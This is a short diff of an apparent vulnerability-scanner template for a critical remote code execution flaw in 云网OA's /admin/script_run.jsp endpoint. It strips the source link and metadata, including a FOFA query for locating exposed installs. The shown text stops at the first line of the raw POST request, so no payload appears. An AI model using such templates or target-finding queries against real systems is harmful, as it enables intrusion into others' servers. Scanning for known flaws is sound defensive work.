@@ -3,12 +3,8 @@ info:
   name: 云网OA script_run存在远程代码执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rbgukvutfivs1vgu'
+  description: ''
   tags: rce,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rbgukvutfivs1vgu
-    fofa: body="云网OA"
 http:
 - raw:
   - 'POST /admin/script_run.jsp HTTP/1.1
